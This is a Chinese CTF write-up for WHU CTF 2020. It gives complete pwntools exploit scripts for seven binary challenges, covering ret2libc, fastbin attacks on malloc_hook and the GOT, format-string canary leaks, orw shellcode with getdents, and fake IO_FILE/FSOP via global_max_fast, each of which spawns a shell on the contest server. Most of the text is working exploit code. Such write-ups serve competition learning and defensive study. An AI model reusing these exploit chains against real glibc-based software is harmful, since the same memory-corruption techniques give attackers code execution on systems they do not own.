# WHU CTF 2020


赛场http://iwhu.info/  武大萌新赛（whu的萌新已经强大到这种地步了嘛

虽然题目大部分还算基础，但还是有很多新姿势的。

<!--more-->


## pwnpwnpwn

常规的ret2libc，给了lib版本

```python
from pwn import *

context.log_level = 'debug'

# io = process("./pwn")
io = remote("218.197.154.9" ,10004)

elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")

payload = 0x88*'a'+p32(0x804A020+0x500) + p32(elf.plt['write']) + p32(0x804843B) 

payload += p32(1)+ p32(elf.got['write'])

io.sendlineafter("Ready?\n",payload)

write_addr = u32(io.recv(4))
libc_base = write_addr - libc.sym['write']
print hex(libc_base)
sys_addr = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search("/bin/sh").next()

payload = 0x8c*'a'+p32(sys_addr) + 'a'*4 + p32(bin_sh)
io.sendlineafter("Ready?\n",payload)

io.interactive()
```

>  WHUCTF{welc0me_t0_pwn_woRld}

## FFF

`delete`功能里明显可以`uaf`。不让改got，保护全开，估计得改`malloc_hook` 

通过`unsorted bin` 泄露lib，然后`fastbin` 打到`malloc_hook`即可，数据错位得到`0x7f` ，请求`0x60` 即可

```python
#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep
import sys

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x : p.recv(numb = x)
sa = lambda p, a,b : p.sendafter(a,b)
sla = lambda p, a,b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./pwn"
ip = "218.197.154.9"
port = 10007

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc-2.23.so"
if LOCAL:
    io = process(filename)
    # io = process(filename,aslr=False)
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    #libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    # libc = elf.libc
    libc = ELF(remote_libc)

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, XXX, str(idx))
    
def lg(name, val):
    log.info(name+" : "+hex(val))

def add(size):
    sla(io,"> ","1")
    sla(io,'size?',str(size))

def edit(idx,size,con):
    sla(io,"> ","2")
    sla(io,'index?',str(idx))
    sla(io,'size?',str(size))
    sn(io,con)

def show(idx):
    sla(io,"> ","3")
    sla(io,'index?\n',str(idx))

def free(idx):
    sla(io,"> ","4")
    sla(io,'index?',str(idx))

pause(io)

add(0x100)#0
add(0x60)#1
free(0)
show(0)

malloc_hook = u64(rv(io,6)+"\x00"+'\x00') - 0x68
lg("malloc_hook:",malloc_hook)
lg("libc:",libc_base)
gadget = 0x4526a + libc_base

# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


target_chunk = libc_base + 0x155555328b05 - 0x155554f64000 - 0x18
print(hex(target_chunk))
add(0x20)#2
free(1)
edit(1,0x60,p64(target_chunk))
add(0x60)#3
add(0x60)#4

payload = 'a'*(malloc_hook-target_chunk-0x10) + p64(gadget)

edit(4,len(payload),payload)
add(0x8)

io.interactive()
```

> WHUCTF{FFFFFFFFFFFFFFastbin_Attack_5e58440652e52e354ae12af8775bec97}

## arbitrary

`f1()` 输入一个地址实现任意地址写入八字节数，`f2()`有金丝雀的栈溢出。

`f3()` 格式化字符串漏洞，`_printf_chk` 会过滤掉$，得手动调了

输入多个`%p` 找到位置，进而泄露`libc` ，还意外的泄露了canary 

![](https://i.loli.net/2020/06/05/GtqD5RQKXskIujL.png)

![](https://i.loli.net/2020/05/30/fUgqtGKPsBhcaYE.png)

这题被官网write up误导了，read不会产生`\x00`输入截断，直接输入金丝雀就行。本地不知道为什么没打通，不过这题也没啥营养了。

```python
from pwn import *
context.log_level='debug'
r=process('./pwn',aslr = False)
context(arch = 'amd64', os = 'linux', endian = 'little')
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
gdb.attach(r,"b *0x555555554B80")
# C01
def f2(buf):
	r.sendlineafter("choice>>",'2')
	r.sendlineafter("input data:\n",'a'*8)
	r.sendlineafter("input data:\n",buf)

def f3(string):
	r.sendlineafter("choice>>",'3')
	r.sendlineafter("input data:\n",string)

f3(".%p"*10+".")
# 6-ca7 -> elf_base  10-240 __libc_start_main 8 -> canary
for i in range(6):
	r.recvuntil(".")
elf_base = int(r.recvuntil(".",drop=True),16) - 0xca7
r.recvuntil(".")
canary = int(r.recvuntil("0a.",drop=True)+'00',16)
r.recvuntil(".")
__libc_start_main = int(r.recvuntil(".",drop=True),16) - 240
libc_base = __libc_start_main - libc.sym['__libc_start_main']

success("elf_base:"+hex(elf_base))
success("libc_base"+hex(libc_base))
success("canary:"+hex(canary))

f2("b"*0x38+p64(canary)+p64(0x202520+elf_base)+p64(0xC08+elf_base))

f3(asm(shellcraft.sh()))
f2("b"*0x38+p64(canary)+p64(0x202020+elf_base)+p64(0x202060+elf_base))
# 0x202060+elf_base

r.interactive()
```

> WHUCTF{Do_yOu_kNow_canary}

## shellcode

沙盒逃逸（？）的`orw` ，这里参考了一下[民间答案](https://www.jianshu.com/p/f74964be92f6),用到`getdents` 扫描服务器文件夹，找到flag位置。不能直接用sh貌似是因为`mprotect` （？）

```c
int getdents(unsigned int fd, struct linux_dirent *dirp,
                    unsigned int count);
// 从文件描述符fd中读取长度为count的内容到dirp所指的区域
```

第一阶段扫描整个目录，先`open` 得到的fd会存放在rax中，然后`getdents`扫描存放在`rsp` 中，然后`write` 出来

```python
shellcode = shellcraft.open("./",0x10000)
shellcode += shellcraft.getdents("rax","rsp",0x300)
shellcode += shellcraft.write(1,"rsp",0x300)
```

可以看到结果可以勉强辨认，与当前文件夹内容相同（本地测试）

![](https://i.loli.net/2020/06/10/hREvTwMp2m3HJCt.png)

拿到服务器上跑，可以发现有个FFFFFFFFFlag文件夹，进一步解析这个文件夹发现flag在里面，打印出来即可

```python
payload = shellcraft.open("./FFFFFFFFFlag/flag",0)
payload += shellcraft.read("rax","rsp",0x300)
payload += shellcraft.write(1,"rsp",0x300)
```

可以看到`read` 只能读取文件，而`getdents` 能读取文件夹

> WHUCTF{ORWOWRROWRWOWORWRO_779243c8c5097c6920d52b79d31f0d4a}

## attention

`uaf`+`fastbin attack`打`got`表，构造chunk size即可，比较简单。

```python
#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep
import sys

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x : p.recv(numb = x)
sa = lambda p, a,b : p.sendafter(a,b)
sla = lambda p, a,b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./pwn"
ip = "218.197.154.9"
port = 10002

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc-2.23.so"
if LOCAL:
    io = process(filename)
    # io = process(filename,aslr=False)
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    #libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    # libc = elf.libc
    libc = ELF(remote_libc)

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, XXX, str(idx))
    
def lg(name, val):
    log.info(name+" : "+hex(val))

def add():
    sla(io,"your choice :\n","1")

def edit(name,data):
    sla(io,"your choice :\n","2")
    sa(io,'name:\n',name)
    sla(io,'data:\n',data)

def show():
    sla(io,"your choice :\n","4")

def free():
    sla(io,"your choice :\n","3")


pause(io)
# mydebug(io,"b *0x0400906")
fake_chunk = 0x06010A0
for i in range(0x40):
    add()

free()
edit(p64(fake_chunk),'b')
add()
add()
edit(p64(elf.got['atoi']),'c')
show()
ru(io,"name:")
atoi_addr = u64(rv(io,6)+'\x00\x00')
libc_base = atoi_addr - libc.sym['atoi']
lg("base:",libc_base)
sys = libc_base + libc.sym['system']

edit(p64(sys),'d')
sla(io,"your choice :\n","/bin/sh")

io.interactive()

```

> WHUCTF{Should_You_Attack_Bss}

## overflow

考察IO FILE。一般都是打`scanf` 之类的函数，这题可以直接在`bss` 伪造整个IO FILE，把`vtable`填充为`one_gadget`地址，令`stdout` 指向这个FILE结构体便能跳转到shell。

~~这题花的时间最长还是没有解决，不太清楚IO FILE结构体哪些东西需要赋值为哪些特殊的值才能通过检测，又得看源码了吗/(ㄒoㄒ)/~~ ~~最骚的是跑官方wp可以跑通，一挂上gdb就崩，导致无法调试，擦这什么神必题目~~

https://xz.aliyun.com/t/2608 可以按照2018网鼎杯Lilac提供的blind题解（葵佬nb！）构造IO_FILE

令vtable指向`addr+240` ，然后在`addr+240`中构造虚表，把` xsputn` 位置改为one_gadget就能在下次调用`printf` 的时候getshell

~~~c
void * funcs[] = {
   1 NULL, // "extra word"
   2 NULL, // DUMMY
   3 exit, // finish
   4 NULL, // overflow
   5 NULL, // underflow
   6 NULL, // uflow
   7 NULL, // pbackfail
   8 NULL, // xsputn  #printf
    ...
}
~~~

exp如下：

~~~python
from pwn import *

context.log_level = 'debug'

io = process("./pwn",aslr=False)
# io = remote("218.197.154.9",10006)
elf = ELF("./pwn")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(io,"b *0x555555554B60")

def rread(offset):
	io.sendlineafter("Choice:","1")
	io.sendlineafter("Offset:\n",str(offset))

def wwrite(offset,size,data):
	io.sendlineafter("Choice:","2")
	io.sendlineafter("Offset:\n",str(offset))
	io.sendlineafter("Size:\n",str(size))
	io.sendlineafter("Input data:\n",data)
	
io.recvuntil("Gift:\n")
addr = int(io.recv(14),16)
elf_base = addr - 0x202060
success("elf_base:"+hex(elf_base))

rread(-0x40)
io.recvuntil("This is your data:\n")
libc_base = u64(io.recv(6)+'\x00\x00')-0x7f2f223cb620+0x7f2f22006000
success("libc_base:"+hex(libc_base))


payload = p64(0xfbad8800)+p64(addr)*7
payload += p64(addr+1)+p64(0)*4+p64(addr)+p64(1)
payload += p64(0xffffffffffffffff)+p64(0)+p64(addr)+p64(0xffffffffffffffff)
payload += p64(0)+p64(addr)+p64(0)*3+p32(0xffffffff)+p32(0)+p64(0)*2+p64(addr+240)

payload += p64(0)*7 + p64(libc_base + 0x4526a)
print(len(payload))
wwrite(0, "-1", payload)
io.recv()
io.sendline("2")
io.recv()
io.sendline("-48")
io.recv()
io.sendline(str(8))
io.recv()

io.sendline(p64(addr))
~~~

> WHUCTF{Bss_Overflow_And_File_Struct_Exploitation}

## heaptrick

进阶堆技巧+fsop，mark

打`global_max_fast` ，让`fastbin` 的最大大小变大，而free堆块后，系统根据fastbin大小的不同，在main_arena的fastbinY数组中填入被free堆块的地址。例如size=0x20的fastbin地址填在main_arena+8，0x30的fastbin地址填在main_arena+16……直到0x80的fastbin在main_arena+56。

> 设fastbinsize的堆块放在main_arena+offset位置，推出公式为：
>
> fastbinsize=2*(offset+8)

所以可以打到main_arena后面的某些数据，让其指向某个堆块。这里选择打`_IO_list_all` ，为`_IO_FILE`数组的头指针，位于main_arena+0xa00；

> 当系统执行exit(0)时调用`_IO_flush_all_lockp`函数，该函数寻找下一个`_IO_FILE`结构体，将调用该结构体vtable中的`_IO_OVERFLOW函数` (位于vtable+0x18处)，虚表见上

详情参考https://docs.qq.com/doc/DUGp2TFBBb1hFRm11?pub=1&dver=2.1.0

~~~python
from pwn import *
env=os.environ
env['LD_PRELOAD']='./heaptrick.so'
context.log_level='debug'
#r=process('./heaptrick')
r=remote('218.197.154.9',10003)
def add(size,cont):
    r.recvuntil('exit\n')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(cont)
def delete(idx):
    r.recvuntil('exit\n')
    r.sendline('2')
    r.recvuntil(':\n')
    r.sendline(str(idx))
def edit(cont):
    r.recvuntil('exit\n')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(cont)
#step 1:leak elfbase and libc
r.recvuntil('exit\n')
r.sendline('666')
elfbase=int(r.recvline()[:-1],16)-0x202040
bsscomment=elfbase+0x2020e0
success("elfbase:"+hex(elfbase))
add(0xa0,'0'*0xa0)#0
add(0xa0,'1'*0xa0)#1
fakefile=p64(0)*3+p64(1)+p64(0)*21+p64(bsscomment-0x18)
#fakesize=2*(&_IO_list_all-&main_arena+8)-0x10=0x1400
fakesize=0x1400
add(fakesize,fakefile)#2
delete(0)
add(0xa0,'2'*7)#0
r.recvuntil('2'*7+'\n')
leak=u64(r.recvline()[:-1].ljust(8,'\x00'))
success("leak:"+hex(leak))
lbase=leak-0x7ffff7dd1b78+0x7ffff7a0d000
global_max_fast=leak-0x7ffff7dd1b78+0x7ffff7dd37f8
_IO_list_all=leak-0x7ffff7dd1b78+0x7ffff7dd2520
one=lbase+0x4526a
success("lbase:"+hex(lbase))
success("maxfast:"+hex(global_max_fast))
success("io:"+hex(_IO_list_all))
#step 2:overwrite global_max_fast with big value
edit(p64(one)+p64(0)*3+p64(global_max_fast))
#step 3:free fake chunk and change _IO_list_all to fake chunk
delete(2)
#step 4:call exit and go to _IO_flush_all_lockp
r.recvuntil('exit\n')
r.sendline('4')
r.interactive()
~~~

> WHUCTF{Nice_Heap_Tricks!!!}

个人感觉不需要打IO_FILE，可以直接打`free_hook` ，然后在堆中填充shellcode即可
